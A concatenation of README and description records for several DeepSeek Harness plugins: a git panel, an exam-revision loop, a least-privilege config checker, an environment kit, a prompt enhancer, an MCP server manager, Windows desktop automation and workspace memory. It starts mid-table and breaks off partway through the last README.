| **`.gitignore`** | Infers the rules from the project's manifests and layout. One button creates it; one adds what is missing **and tidies the whole file** — exact duplicates, rules an earlier broader rule already covers (`node_modules/.cache/` after `node_modules/`), and runs of blank lines. It groups entries under headings only when that cannot change the meaning: with a `!` rule (git decides by the last match, so order is semantic) or with your own comments, the order is kept and the panel says so. |

Buttons that call a model are marked **AI**. Every generation uses the session's default model — there is no second model to configure.

## Branches, history, remotes

- **Branch selector** — switch, create, delete, and merge any branch into the checked-out one. A conflicted merge is reported with the files that need a decision, and can be aborted.
- **Commit graph** — every branch and remote-tracking branch, not just this one. Expand a commit for its full message, the files it touched, and what you can do to it: rewind, revert, cherry-pick, rebase, or tag. Click a changed file to see its diff inside that commit.
- **Remotes** — push, pull, fetch, and a **Sync** that fetches, fast-forwards, then pushes. It refuses to merge a diverged branch rather than inventing a merge commit.
- **Stash** — set work aside and take it back later (pop, apply, drop).

## Setup

Without a repository the **history button is disabled** — there is no history to show — while **settings stays reachable**, because that is where someone looks when the panel is not doing what they expect. If the repository disappears while the panel is open (the folder changed, `.git` was removed), the view falls back to the change list rather than leaving the button lit on a view that cannot render.



One click initialises a repository and writes the local commit identity; two buttons handle `.gitignore`. Nothing is chosen from a list of ecosystems — the plugin reads the project and decides.

## Configuration

Settings live in this plugin's own row in `cordis.patch.yml`, so they survive upgrades and stay visible on the Plugins page. Everything below is a button or a checkbox; there is nothing to type unless you want custom instructions.

| Key | Default | Meaning |
| --- | --- | --- |
| `messageLanguage` | `auto` | Language of generated text: `auto` (follow the repository), `en`, `zh`. When unset or `auto`, the panel's own messages read as Chinese. |
| `messageStyle` | `conventional` | `conventional` (`feat: …`) or `plain`. |
| `messageTemplate` | — | Extra instructions, appended last so they override the defaults. |
| `signoff` | `false` | Add a `Signed-off-by` trailer. |
| `defaultBranch` | `main` | Branch created by *Initialise*. |
| `maxPromptBytes` | `24000` | Diff text handed to the model per change set. |
| `maxDiffBytes` | `80000` | Patch text a tool returns before truncating. |
| `commandTimeoutMs` | `60000` | Per git command; network commands get four times this. |

## Safety

- **Nothing destructive happens on a single click.** Discarding, deleting a branch, dropping a stash, rebasing, and rewinding all ask first, and say what will be lost.
- **Rewinding and reverting are separate**, because they are: rewinding moves the branch and rewrites history, reverting adds an inverse commit and is safe for anything already pushed. The panel warns before a rewind that would rewrite published history.
- **"Undo this commit" and "rewind to here" are separate too.** On the newest commit the button undoes that commit and leaves its changes staged, unstaged, or deleted as you choose; on an older commit it moves the branch pointer back to that commit. The notice names the commit that was actually undone and always states how many were discarded — including none.
- **A refusal says which mode refused.** A read-only session cannot write `.git`, so committing and switching branches are rejected by design; the message names the mode and what to switch to. If it is already `danger-full-access` and still refused, the sandbox backend on that machine is refusing writes and the Harness needs restarting — two different problems, told apart.
- **git's own diagnostics are pinned to English** (`LC_ALL=C`). The plugin's text is still localised by the setting; git's is kept stable because the phrase table in `lib/text.js` matches English sentences, and a localised git defeats it — worse on Windows, where git writes in the console code page and the pipeline decodes UTF-8, so a Chinese message arrives as mojibake.
- **The

plugins.readme_text:
# mastery-loop

**A general exam-revision loop for DeepSeek Harness.** It reads your course materials and your notes vault, then drills you — question, grade, question again — until **every knowledge point** reaches your target accuracy, and finally hands you a pre-exam list.

Two things make it different from a quiz bot:

- **Every question requires you to write your reasoning, not just your answer.** Grading checks the reasoning first, then the answer. **A lucky guess does not count as correct.**
- **Wrong-answer reasons are stored verbatim and reused.** So a mistake you make three times is counted three times, instead of splitting into three near-synonyms and vanishing from the statistics.

通用应试复习闭环：读你的课程材料与笔记库 → 出题 → 批改 → 再出题，直到每个知识点的熟练度都达到目标正确率，最后产出考前 list。**每道题都要求你写出思维链**，批改先判思维链再判答案，**蒙对不算对**。

---

## 安装

```bash
dsh plugin --profile web add dsh-mastery-loop
```

## 用法：两步

### 1 · 先初始化（只跑一次）

```
/mastery-loop-setup
```

它会探测你的课程材料与笔记库，问清路径 / 素材 / 语言 / 融合方式 / 卷子格式，然后在你**知识库根目录**生成 6 个文件并校验：

| 文件 | 作用 |
| --- | --- |
| `ledger.md` | 复习账本（进度 + 已初始化的凭据） |
| `index.md` | 主题 → 知识点的反向索引 |
| `errors.md` | 错误原因表 |
| `paper-format.md` | 每个课程的每个考试的卷子格式 |
| `error-taxonomy.md` | 失分原因分类（**初始为空**，等归纳） |
| `config.md` | 路径 / 每门课的素材选择 / 语言标准 |

> 初始化**有意做成独立的 skill**：它要问六组问题，跟日常复习是两件事。分开之后 `mastery-loop` 本身短得多。

### 2 · 之后正常复习

```
/mastery-loop
```

或者直接用自然语言说「我想开始复习了」—— 这个 skill **模型可以自动调用**。

## 复习循环长什么样

```
读状态 → 与用户逐步确认（范围 / 目标正确率 / 是否混合考）
   → 复习清单
   → 出题（每题后面挂「答案：」「思维链：」两行）
   → 批改（先判思维链 → 再判答案 → 错了才提炼错误原因）
   → 写回账本与错误原因表
   → 达标？→ 问是否继续
   → 考前 list（从第一轮就开始攒，不是最后生成）
```

**达标是逐点判断的**：一个知识点要「**总共出过 ≥ 5** 且 **熟练程度 ≥ 目标正确率**」。不到 5 次标「样本不足」，继续出题。

## 错误原因为什么写成英文

`errors.md` 里的错误原因**默认用英文** —— 因为要套 **ASD-STE100（简化技术英语）** 的写法：一句一个偏移、不超过 20 词、动词开头、不写题号和数字。

这样做的目的是**可统计**：同名错误必须逐字一致，才能数出「我在这一点上错了几次」。

> ⚠️ 口径说明：本 skill **借用 ASD-STE100 的原则**，**不声称符合** ASD-STE100 —— 官方明说它不适用于一般写作。
> 另外，「同一表述必须逐字复用」是本 skill 的**跨文档外推**（STE 只要求「一篇文档内一致」）。**这个外推的责任在本 skill，不在 ASD。**

## 一次只复习一门课吗

**建议**。但范围由你定 —— 跨多门时 skill 会问你是否要**跨课程混合出题**（**默认不混合**）。

## 语言

**按产物类别分别定**（知识点笔记 / 出的题 / 批改解析 / 记录性文件 / 产出 / 机制层），在初始化时问你。想要中英双语对照、法文、或纯中文都行 —— 除了 `errors.md` 的错误原因默认英文（要套 STE）。

## License

MIT

plugins.readme_text:
# @deepwhale-cn/dsh-least-privilege

[![Listed on dsh-plugin.org](https://dsh-plugin.org/badges/listed.svg)](https://dsh-plugin.org/plugins/feely0208/dsh-least-privilege)


**关键词**：最小权限 · 权限过宽 · 权限管理 · 容器 root · IAM · CORS · 访问控制 · 权限最小化 · 特权容器
**Keywords**: least privilege · over-permission · container root · IAM wildcard · CORS · access control
**最小权限检查** —— 容器跑 root、IAM 通配、CORS 全开、令牌申请 admin。

## 不装它会怎样

你的部署里有这么一段：

```yaml
services:
  app:
    privileged: true
```

当时是为了让容器能访问某个设备，后来那个需求没了，**但这行留下了**。

哪天应用出了个漏洞，攻击者进到容器里 —— 而因为 `privileged`，
他拿到的几乎是**宿主机**。

**权限过宽是入侵的放大器**，而且它**没有任何症状** —— 系统照常跑，
直到出事那天你才发现那把钥匙能开所有的门。

## 它查什么

| 级别 | 内容 |
|---|---|
| 🔴 高 | 容器跑 root / `--privileged` · IAM `Action: *` |
| 🟡 中 | CORS 允许所有来源 · 令牌申请 admin/全量 scope |

## 安装

```bash
dsh plugin --profile web add @deepwhale-cn/dsh-least-privilege
# 或纯 CLI
npx @deepwhale-cn/dsh-least-privilege
```

## 用法

```bash
dsh-least-privilege --demo
dsh-least-privilege --list-rules
dsh-least-privilege --html r.html
```

![dsh-least-privilege 检查报告示例](https://www.deepwhale.org.cn/plugin-assets/dsh-least-privilege/report.png)

![dsh-least-privilege 演示模式输出](https://www.deepwhale.org.cn/plugin-assets/dsh-least-privilege/demo.png)

![dsh-least-privilege 规则与依据](https://www.deepwhale.org.cn/plugin-assets/dsh-least-privilege/rules.png)

## 边界

- **只查「明显过宽」的写法** —— 权限偏大但没用通配符的，需要人工评审。
- **不解析云厂商实际生效策略** —— IAM 有继承/条件/边界，只看仓库里字面写的。
- **Dockerfile 可能多阶段** —— builder 阶段的 `USER root` 通常无害，需你判断。
- 与 [dsh-data-scan](https://github.com/feely0208/dsh-data-scan) 分工：那个查数据，这个查**访问数据的权限**。

本插件是一个工具。使用者必须遵守所在地区法律法规，**对使用本项目造成的任何后果自行承担责任。**

---

## 深鲸网安守护系列（共 31 个）

> 一个插件做一件事。**安全问题是链式的** —— 配套用才完整。

**国内合规** ｜ [等保对照](https://github.com/feely0208/dsh-cn-mlps) · [日志留存](https://github.com/feely0208/dsh-cn-log-retention) · [备案公示](https://github.com/feely0208/dsh-cn-filing) · [用户同意](https://github.com/feely0208/dsh-consent-guard) · [个人信息权利](https://github.com/feely0208/dsh-data-rights) · [未成年人保护](https://github.com/feely0208/dsh-minor-guard) · [影响评估](https://github.com/feely0208/dsh-pipia) · [数据分类分级](https://github.com/feely0208/dsh-data-classify) · [算法备案](https://github.com/feely0208/dsh-algorithm-filing) · [数据出境](https://github.com/feely0208/dsh-cn-data-export) · [国密合规](https://github.com/feely0208/dsh-cn-crypto) · [AI 内容标识](https://github.com/feely0208/dsh-cn-ai-labeling)

**AI 与 Agent 治理** ｜ [AI 输出信任](https://github.com/feely0208/dsh-ai-output-trust) · [外部内容信任](https://github.com/feely0208/dsh-content-trust) · [MCP 安全](https://github.com/feely0208/dsh-mcp-audit) · [Agent 权限](https://github.com/feely0208/dsh-agent-scope) · [策略核对](https://github.com/feely0208/dsh-agent-policy) · [可疑指令](https://github.com/feely0208/dsh-phishing-guard)

**数据与凭据** ｜ [敏感数据](https://github.com/feely0208/dsh-data-scan) · [密钥轮换](https://github.com/feely0208/dsh-key-rotate) · [数据留存](https://github.com/feely0208/dsh-data-lifecycle) · [配置审计](https://github.com/feely0208/dsh-env-audit) · [密钥扫描](https://github.com/feely0208/dsh-secret-scan)

**供应链与构建** ｜ [开源许可](https://github.com/feely0208/dsh-license-guard) · [依赖投毒](https://github.com/feely0208/dsh-dep-audit) · [CI 安全](https://github.com/feely0208/dsh-ci-guard) · [工具审查](https://github.com/feely0208/dsh-tool-vet) · [物料清单](https://github.com/feely0208/dsh-sbom)

plugins.description: DeepSeek Harness 环境工具插件：env_probe 探明网络/代理/可写性/子进程管道，safe_json_edit 无 BOM 安全改 JSON，git_repair 检测并重建丢失的 .git 元数据。
plugins.readme_text:
# dsh-envkit 🔧

**DeepSeek Harness 环境工具插件**：在"某类操作莫名失败"时先探明环境，而不是猜。

三个工具都来自真实事故的沉淀（详见 [为什么](#为什么有这三个工具)）。

---

## 工具

### `env_probe` — 一次性探明环境

| 探什么 | 为什么 |
|---|---|
| 网络端点可达性（npm / GitHub API / raw / codeload / jsDelivr / PyPI） | 某个源不通时，换另一个（如 API 限流就改走 codeload tarball） |
| 代理环境变量 | 用户开了代理但工具没继承时，症状会伪装成"服务挂了" |
| 临时目录 / 家目录 / 当前目录可写性 | 安装器或包管理器报 `拒绝访问` 时先确认到底哪里不可写 |
| **子进程管道 spawn 能力** | 受限沙箱下 Node `spawn(stdio:'pipe')` 会 `EPERM`，表现为"命令莫名跑不起来" |
| 平台 / Node 版本 | 版本相关的坑很多 |

返回里还带 `hints`——按探测结果给出针对性建议，而不是丢一堆原始数据。

### `safe_json_edit` — 无 BOM 安全改写 JSON

DSH 的头号杀手：**profile 的 `package.json` 被写入 UTF-8 BOM**，之后 `dsh plugin` 全命令报
`SyntaxError: Unexpected token '﻿'`。

本工具：读取时**容忍 BOM**，写回时**保证无 BOM、原子替换**，默认**留一份备份**，并支持点路径操作：

```jsonc
{
  "file": "C:\\Users\\you\\.dsh\\profiles\\desktop\\package.json",
  "set": { "dsh.profile.bundles": ["@deepseek-ai/dsh-base", "@deepseek-ai/dsh-web-app", "dsh-edict"] },
  "del": ["dependencies.something-old"]
}
```

`{"inspectOnly": true}` 只检查（是否带 BOM、能否解析、缩进与换行风格），不改文件。

### `git_repair` — `.git` 元数据丢失检测与重建

`.git/objects` 和 `refs` 还在、但 `HEAD` / `config` / `index` 被删时，git 会报
`not a git repository`。本工具识别这种状态（`metadata-lost-objects-intact`）并给出重建步骤：

```
git init → git branch -M main → git remote add origin <remote>
→ git fetch origin → git reset --mixed origin/main   # 保留工作区改动
```

**默认 `dryRun: true`**，只列命令不执行；确认后传 `dryRun: false`。

---

## 安装

```bash
dsh plugin --profile desktop add dsh-envkit
```

装完**重启 DSH**：设置页会出现「环境工具」面板（可视化展示探测结果 + 一键检查本机各 profile 的 BOM 与 bundles 状态）。

无 UI 时也可用命令：`env-probe`、`env-json-check <file>`、`env-git-check [dir]`。

## 设置页面板

- 网络端点可达性（✓/✗ + 状态码 + 耗时）
- 运行环境（子进程管道、各目录可写性、代理变量）
- 提示（按探测结果生成）
- **「检查我的 profile」**：只读列出每个 profile 的 `hasBom`、`bundles/deps` 数量、以及"已装但未启用"的插件

---

## 为什么有这三个工具

这份插件的每一条都对应本仓库作者真实踩过的坑：

| 事故 | 症状 | 对应工具 |
|---|---|---|
| profile 被写入 BOM | `dsh plugin` 全命令 `SyntaxError` | `safe_json_edit` |
| 沙箱剥离 TLS 凭据 / 限制命名管道 | `schannel: SEC_E_NO_CREDENTIALS`、`spawn EPERM` | `env_probe` |
| GitHub API 匿名限流 60/h | 安装/探测报"无法安装"，但插件本身没问题 | `env_probe`（提示改走 codeload） |
| `.git` 元数据被删 | `not a git repository`，但 objects/refs 都在 | `git_repair` |

## 安全边界

- `env_probe` **只做只读探测**（GET 请求 + 临时文件写入后立即删除）
- `safe_json_edit` 会**改文件**，因此：默认备份、原子写、支持 `inspectOnly`
- `git_repair` 默认 `dryRun`，且只做 init/fetch/reset（**不删任何东西**）

## 开发

```bash
npm test          # 契约测试 + 冒烟测试
npm run contract  # 只跑契约测试（校验 dsh.bundle / dsh.client / exports 成对 / 路由存在）
```

契约测试与 [`dsh-plugin-authoring`](https://github.com/Caoran1314/dsh-edict) 技能里的范式一致。

## License

MIT

plugins.readme_text:
# DSH 提示词增强器

**简体中文** ｜ [English](README.en.md)

DeepSeek Harness（DSH）插件。在输入框写提示词，点一下按钮，模型改写后替换输入框内容。

- 包名：`@jianyiagi/dsh-prompt-enhancer`
- 仓库：https://github.com/JianYiAG/dsh-prompt-enhancer
- 许可：MIT

---

## 安装

**桌面端**：

1. 左侧栏进「插件」页
2. 安装 bundle，填 `@jianyiagi/dsh-prompt-enhancer`
3. 完全退出应用后重新打开

**CLI / Web 端**：

```powershell
dsh plugin --profile <profile> add @jianyiagi/dsh-prompt-enhancer
```

CLI 安装后若未生效，在「插件」页勾选该插件，或把包名加入 profile `package.json` 的 `dsh.profile.bundles`，然后重启应用。

安装与常见问题见 [DISTRIBUTION.md](DISTRIBUTION.md)。

---

## 使用

1. 在输入框输入提示词
2. 点模型选择器左侧的按钮
3. 按钮停止转动后，输入框内容已替换为改写结果；不满意可在输入框内撤销

输入框为空时按钮不显示。

也可输入 `/prompt-enhance 提示词`，结果以命令结果行显示，不写回输入框。

---

## 配置

默认使用当前会话的模型。可在 profile 补丁中指定固定模型：

```yaml
- insert:
    - id: prompt-enhancer
      name: '@jianyiagi/dsh-prompt-enhancer'
      config:
        provider: <provider-id>
        model: <model-id>
```

两个字段需同时提供；删除 `config` 即恢复使用会话模型。

---

## 卸载

桌面端在「插件」页卸载；CLI：

```powershell
dsh plugin --profile <profile> remove @jianyiagi/dsh-prompt-enhancer
```

---

MIT

plugins.description: MCP Master for DeepSeek Harness: per-session MCP server picker with global and project (.mcp.json) catalogs, OAuth sign-in, and trust review
plugins.readme_text:
# dsh-mcp-master

English | [中文](README.zh.md)

**MCP Master for [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness).** Choose which MCP servers each session uses — from your **global** list and the workspace's **project** list — with a picker that sits right before the composer's model selector. Pick them when a session starts, and switch them at any time afterwards, just like the model.

- **Project servers** come from the files other agents already use: `.mcp.json` (Claude Code), `.cursor/mcp.json`, `.vscode/mcp.json`, `.dsh/mcp.json`.
- **Global servers** come from `~/.dsh/mcp-master/mcp.json` (same `mcpServers` format). A project server shadows a global one of the same name.

```json
// <workspace>/.mcp.json  or  ~/.dsh/mcp-master/mcp.json
{
  "mcpServers": {
    "orion-mcp":            { "command": "uv", "args": ["run", "--project", ".", "orion-mcp"] },
    "atlassian-mcp-server": { "type": "http", "url": "https://mcp.atlassian.com/v1/mcp/authv2" },
    "conduktor-console":    { "command": "npx", "args": ["mcp-remote", "https://…/api/mcp", "--header", "Authorization: Bearer ${CONDUKTOR_API_TOKEN}"], "enabled": false }
  }
}
```

## The picker

`[ 🔌 MCP 2 ● ]  [ model ▾ ]  [ ➤ ]` — in the composer row of every session, including a brand-new one.

- **Zero footprint when unused**: no global or project servers → nothing renders.
- **Chip**: number of servers active in this session and one status dot for them (green connected · amber sign-in needed · red failing · pulsing starting). A small blue dot means project servers await review.
- **Panel** (click the chip; Esc / click outside to close): *Project* and *Global* groups. Each row has a **checkbox = use in this session**, status, transport, a `default` tag, and inline **Sign in** / **Retry**. Expand a row for the command/URL (as written — never variable-expanded), auth, server version, tools, logs, Reconnect, Sign out, Revoke trust.
- **Footer**: what new sessions start with, and **Use for new sessions** to save the current selection as this workspace's default (**Reset** returns to the files' own `enabled` flags).
- Theme tokens only (light/dark follow the app); copy follows **Settings → General → Language**.

## How sessions get servers

| Topic | Behavior |
|---|---|
| New session | Starts from the workspace default: the saved one, or else every trusted server whose file entry is not `"enabled": false` / `"disabled": true`. |
| Forks & subagents | Inherit the parent session's selection (`parentSession`). |
| Switching later | Checking/unchecking registers/unregisters that server's tools in **this session only**, from the next step on. DSH itself records tool additions/removals in the session log (`developer/message` tool-addition/removal), so history, resume, and replay stay consistent — unlike an agent preset, which is a whole plugin composition and therefore locked once the session starts. |
| Persistence | Selections, defaults, trust, and OAuth tokens live in `~/.dsh/mcp-master/state.json` (0600). Config files are never modified. |
| Process lifetime | A server runs while a live session — or a session open in the UI but not started yet — selects it; it stops 2 minutes after the last one deselects it, and a workspace with no sessions or viewers shuts down after 15 idle minutes. |

## Trust (project servers)

A `.mcp.json` in a cloned repository can run any command, so project servers must be **trusted** before they run (same model as Claude Code's project-server approval). Checking an untrusted server shows the exact command/URL with **Trust & use**. Trust is per workspace and bound to the entry as written: if the command, args, env, URL, or headers change, the server becomes **Changed** and needs review again. Global servers are yours and always trusted. `autoTrust: true` skips the review.

## Transports and auth

- **stdio** (own process group, reaped with its children; cwd = workspace root), **Streamable HTTP** (session ids, SSE responses, `list_changed` stream), **legacy HTTP+SSE** (automatic fallback). Server→client `ping` / `roots/list` are answered.
- **OAuth** per the MCP authorization spec: RFC 9728 → RFC 8414/OIDC discovery → RFC 7591 dynamic client registration → authorization code + PKCE (S256) with RFC 8707 `resource`, then refresh. Tokens are keyed by server URL, so one sign-in covers every workspace. An explicit `Authorization` header is used as-is; `"oauth": { "clientId", "clientSecret", "scope" }` covers providers without dynamic registration.
- **Variables**: `${VAR}`, `${VAR:-default}`, `${env:VAR}`, `${workspaceFolder}` — resolved from DSH's environment layered over your login-shell environment (so `~/.zshrc` exports and your shell `PATH` work in the desktop app).
- **Tools** are named `mcp__<server>__<tool>` like the built-in MCP client; input schemas are folded into the registry's JSON-Schema subset (`$ref`, nullable `anyOf`, type arrays, `allOf`; dropped constraints become description hints); `readOnlyHint` tools may run in parallel.

## Configuration (optional)

```yaml
# your profile's cordis.patch.yml
- id: mcp-master
  name: dsh-mcp-master
  config:
    globalConfigFile: ~/.dsh/mcp-master/mcp.json   # false disables the global scope
    configFiles: [.mcp.json, .cursor/mcp.json, .vscode/mcp.json, .dsh/mcp.json]
    autoTrust: false
    searchParents: true          # also look in parent directories of the session cwd
    startupWaitMs: 5000          # a new session waits this long for selected servers that are still starting
    connectTimeoutMs: 60000
    toolCallTimeoutMs: 300000
    idleShutdownMinutes: 15
```

## Security notes

- `/mcp-master/api/*` passes DSH's connection fence (Host/Origin + browser authentication); mutating calls also need a custom header that cross-origin pages cannot send without a CORS preflight; paths must be inside registered workspaces or live session directories.
- The OAuth redirect (`/mcp-master/oauth/callback`) opens in your system browser without the DSH cookie and is authorized by a single-use 192-bit `state`.
- Logs and the UI redact codes, tokens, and `Bearer` values; command lines are shown unexpanded. `state.json` holds tokens — treat it like a credentials file.

## Develop

```sh
pnpm install
pnpm run verify          # build + typecheck + tests (node --test runs the .ts tests directly)
```

| Path | Role |
|---|---|
| `src/index.ts` | Host entry: options, agent lifecycle hooks, route mounting |
| `src/host/config.ts` | Catalog discovery (project + global), dialects, variable expansion, fingerprints |
| `src/host/runtime.ts` | Trust, defaults, per-session selections, server lifecycle, per-agent tool registration |
| `src/host/state.ts` | Persistent state (`~/.dsh/mcp-master/state.json`) |
| `src/host/stdio.ts`, `http.ts`, `jsonrpc.ts` | MCP transports and JSON-RPC plumbing (zero runtime dependencies) |
| `src/host/oauth.ts` | MCP authorization (discovery, DCR, PKCE, refresh) |
| `src/host/schema.ts`, `tools.ts` | Schema folding and ToolDefinitions |
| `src/host/api.ts` | HTTP API + OAuth callback |
| `src/client/*` | Composer picker (React; `__ModuleLoader__` bundle; portal popover like the model menu) |
| `src/shared/types.ts` | Wire contract between the halves |

After rebuilding an installed copy, restart DSH: the Host module is an ES module and is not re-imported in place.

## License

MIT

plugins.description: Windows desktop automation for DeepSeek Harness: the in-box MCP client bridge mounted against CursorTouch/Windows-MCP, with an off-by-default Computer Use switch and an in-app dependency installer.
plugins.readme_text:
# dsh-windows-mcp

**English** · [中文](https://github.com/helloHub1212/dsh-windows-mcp/blob/main/README.zh.md)

[![npm version](https://img.shields.io/npm/v/dsh-windows-mcp.svg)](https://www.npmjs.com/package/dsh-windows-mcp)
[![CI](https://github.com/helloHub1212/dsh-windows-mcp/actions/workflows/ci.yml/badge.svg)](https://github.com/helloHub1212/dsh-windows-mcp/actions/workflows/ci.yml)

**Windows desktop automation for [DeepSeek Harness](https://github.com/sandbaseai/deepseek-harness-handbook)** — lets the DSH agent see your screen and drive your PC.

This plugin connects [CursorTouch/Windows-MCP](https://github.com/CursorTouch/Windows-MCP) to DSH by mounting one loader row against the **MCP client bridge that already ships inside DeepSeek Harness**. There is no reimplemented protocol client and no second copy of the MCP SDK: the plugin is a *carrier bundle*, and everything you can do comes from the official bridge.

```text
DSH agent
  └─ tool call  mcp__windows__Screenshot
       └─ @deepseek-ai/dsh-mcp-client        (in-box, mounted by this plugin's patch row)
            └─ uvx windows-mcp@0.8.8 serve   (stdio child process)
                 └─ your desktop: UIA tree, Win32 input, screen capture
```

## What it gives the agent

With the plugin installed and Windows-MCP reachable, these tools appear in the tool list:

| Tool | What it does |
| --- | --- |
| `mcp__windows__Screenshot` | Capture the screen; the image lands in the conversation as a real attachment |
| `mcp__windows__Snapshot` | Capture an accessibility tree (text, no image tokens) |
| `mcp__windows__DisplayInventory` | Enumerate displays and their geometry |
| `mcp__windows__Click` / `Move` / `Scroll` | Mouse input |
| `mcp__windows__Type` / `Shortcut` | Keyboard input |
| `mcp__windows__Wait` / `WaitFor` | Sleep, or wait until a UI condition holds |
| `mcp__windows__Scrape` | Extract text from a window |
| `mcp__windows__MultiSelect` / `MultiEdit` | Batch element selection / batch edits |
| `mcp__windows__Clipboard` | Read and write the clipboard |
| `mcp__windows__Process` | List, start and stop processes |
| `mcp__windows__Notification` | Read notifications |
| `mcp__windows__Registry` | Read and write registry values |
| `mcp__windows__ControlStatus` | Control-loop state. **Cannot be disabled** — upstream force-keeps it |
| `mcp__windows__App` | Launch/switch apps. *Excluded by default* (upstream only supports it reliably on an English Windows install) |
| `mcp__windows__PowerShell` / `FileSystem` | *Excluded by default* — DSH already ships shell and file tools |

Plus one tool of its own, `windows_mcp_doctor`, which explains what is wrong when the `mcp__windows__*` tools are missing.

The composer also gains a **Computer Use** pill, next to the permission control: it shows how many desktop tools are actually registered and remembers your choice across restarts (state file: `~/.dsh/dsh-windows-mcp.state.json`). It starts **off** — a fresh install never hands the agent your desktop until you switch the pill on yourself.

Switching it off is a hard switch, not a hint. The bridge keeps running, but from the next step on every `mcp__windows__*` tool is filtered out of the tool list the model sees, and a call that still names one is refused at dispatch — in every session and subagent, live, with no restart. Switch it back on and they return immediately; `windows_mcp_doctor` always reports which way it is set.

> **Verified:** Windows 11 + DSH Desktop 0.2.0-rc.2 — the bridged server advertises
> **18 tools** (the 21 upstream tools minus the three excluded here) and is ready
> about 1.5 s after launch. The bridge publishes each as `mcp__windows__<ToolName>`.

## Requirements

- **Windows 10/11.**
- **DeepSeek Harness Desktop** with the in-box `@deepseek-ai/dsh-mcp-client` bridge (0.2.0-rc.2 or newer).
- **[uv](https://docs.astral.sh/uv/)** on the `PATH` of the process that runs DSH — this is how `uvx` launches Windows-MCP. `%USERPROFILE%\.local\bin` is searched even when it is not on `PATH`.
- **A model that accepts image input** if you want the agent to actually *see* screenshots.

### First start vs. later starts

`uvx` builds an isolated environment for `windows-mcp` the first time it runs, so
the initial launch downloads the Python dependencies (tens of MB) and can take
minutes on a slow connection. The bridge waits roughly a minute per launch and then
retries, so a cold start may take a few attempts before the tools appear.

The server itself is fast once provisioned — measured on Windows 11: **ready about
1.5 s after launch**. To get that from the very first DSH start, provision once:

```powershell
uv tool install windows-mcp          # no time limit; run it once
```

…then point the row at the installed command (`command: windows-mcp`) as described
in [Override the row from your profile](#override-the-row-from-your-profile) —
restate the whole `config`, because a patch replaces it. Either way later starts
reuse the environment `uv` built.

## Install

The plugin is a normal DSH bundle. Install it with DSH's own plugin manager:

1. Open **DSH Desktop → Settings → Plugins**.
2. Add the bundle, pointing at either the published package name, the repository (`github:helloHub1212/dsh-windows-mcp`), or a local checkout of this repo.
3. **Restart DSH** so the new patch layer is composed at startup.

For non-Electron profiles the CLI does the same thing:

```powershell
dsh plugin --profile <profile> add github:helloHub1212/dsh-windows-mcp
```

> The Electron app owns the `desktop` profile; the CLI refuses every command against it, including read-only ones. Use the GUI for `desktop`.

### Install the dependency from the app

Windows-MCP itself is a Python program, so its bundle page in **Settings → Plugins → dsh-windows-mcp** shows the dependency state and installs it for you:

- **Dependency** — `installed 0.8.8`, or *not installed*, or *uv not found*.
- **Download and install** — runs `uv tool install windows-mcp@<pinned>` once, streams the installer output into the page, and offers **Cancel** while it runs.
- When it finishes, the plugin **writes the bridge row into your profile's `cordis.patch.yml` itself** — after a timestamped backup, inside idempotent markers — so the bridge launches the installed executable instead of racing `uvx` against a cold cache. **Restart DSH** to apply that.

The block it writes is exactly the row documented under [Pin a local interpreter instead of `uvx`](#pin-a-local-interpreter-instead-of-uvx); delete the marked block to go back to `uvx`. The same page is what you land on after enabling the bundle (the activation prompt reuses it).

The page also shows the **Patch target**: the `cordis.patch.yml` a manual write would touch, which is the profile this host booted — including a `dsh --profile web` host. If this package sits in more than one profile and the host does not report which one it started, the plugin writes nothing and says so instead of guessing: set `DSH_WINDOWS_MCP_PROFILE=<profile name>` (or an absolute profile directory) for the process that runs DSH and retry.

## Verify

```text
windows_mcp_doctor
```

Prints the resolved `uv`/`uvx`/`python`, the state of `%USERPROFILE%\.windows-mcp`, the effective bridge row, and the `mcp__windows__*` tools that are actually registered. Then ask the agent:

> Take a screenshot of my desktop and tell me what is on screen.

## Configuration

The defaults live in [`cordis.patch.yml`](cordis.patch.yml). Everything below is set through the `env` block of the `windows-mcp-bridge` row.

| Variable | Default here | Effect |
| --- | --- | --- |
| `WINDOWS_MCP_SCREENSHOT_SCALE` | `0.75` | Screenshot downscale, `0.1`–`1.0`. The single biggest lever on image token cost. |
| `WINDOWS_MCP_DISABLE_FLASH` | `1` | Suppresses upstream's orange "control taken over" border on every capture. |
| `WINDOWS_MCP_SCREENSHOT_BACKEND` | `auto` | Capture backend; see upstream docs before overriding. |
| `WINDOWS_MCP_MAX_TREE_ELEMENTS` | `500` | Cap on the accessibility-tree size reported by `Snapshot`. |
| `WINDOWS_MCP_WATCHDOG` | `off` | Upstream watchdog. Off by default because the UIA event pump can take the whole p

plugins.description: Per-workspace persistent memory plugin for DeepSeek Harness (DSH): sidebar panel, automatic system-prompt injection, and an agent tool to save memories
plugins.readme_text:
# dsh-workspace-memories

English | [中文](README.zh.md)

[![](https://img.shields.io/badge/powered_by-dsh-4D6BFE?style=flat-square&logo=deepseek&logoColor=white)](https://github.com/deepseek-ai/deepseek-harness)
[![](https://img.shields.io/npm/v/dsh-workspace-memories?style=flat-square)](https://www.npmjs.com/package/dsh-workspace-memories)
[![](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)

**Per-workspace persistent memory for [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) (DSH)** — a plugin that gives every workspace its own durable memory files, injects them into every session running in that workspace, and lets both you and the agent manage them.

## Why this plugin exists

DSH agents are stateless across sessions: everything a session "learns" — your project's decisions, conventions, hard-won debugging facts — lives only in that conversation's context and is gone when it ends. The built-in mechanism for durable knowledge is `AGENTS.md`, but it is a static, project-owned instruction file: the agent cannot update it on its own, and **some things should not live in the project folder at all** — server addresses and topologies, local environment quirks, machine-specific paths, personal working conventions. Anything under the project tree risks being committed to git by accident.

This plugin closes that gap with a small, explicit memory loop whose default storage is **outside the project directory**:

1. **Every workspace gets a memory directory** — by default under the DSH data directory (`~/.dsh/workspace-memory/<workspace>/`), never inside the repo. Plain Markdown you can read, diff, and back up. (An opt-in `workspace` storage mode keeps memories in `<workspace>/.dsh/memory/` for teams who *want* them versioned alongside the code.)
2. **Memories are injected automatically** — each session created in a workspace carries that workspace's memory files in its system prompt, alongside `AGENTS.md`, so a fresh session starts already "remembering".
3. **The agent can write memories itself** — a global `save_workspace_memory` tool lets any session persist a decision, server detail, convention, or preference the moment you say "remember this".
4. **You stay in control** — a sidebar panel lists, creates, edits, and deletes memory files per workspace, so memory stays inspectable and correctable instead of hidden in a database.

## Features

| Capability | Where |
|---|---|
| Browse / create / edit / delete memory files | **Workspace Memory** sidebar panel (switch workspaces via the selector) |
